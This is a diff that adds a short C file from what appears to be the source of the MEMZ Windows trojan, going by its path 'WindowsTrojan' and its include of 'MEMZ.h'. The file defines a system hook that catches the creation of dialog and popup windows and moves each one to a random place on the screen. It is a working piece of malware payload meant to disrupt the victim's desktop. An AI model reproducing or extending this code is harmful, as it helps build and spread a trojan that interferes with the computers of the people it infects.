+++ WindowsTrojan/Source/Utils/MsgBoxHook.c
@@ -1,0 +1,19 @@
+#include "../MEMZ.h"
+
+LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
+	if (nCode == HCBT_CREATEWND) {
+		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;
+
+		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
+			HWND hwnd = (HWND)wParam;
+
+			int x = random() % (GetSystemMetrics(SM_CXSCREEN) - pcs->cx);
+			int y = random() % (GetSystemMetrics(SM_CYSCREEN) - pcs->cy);
+
+			pcs->x = x;
+			pcs->y = y;
+		}
+	}
+
+	return CallNextHookEx(0, nCode, wParam, lParam);
+}
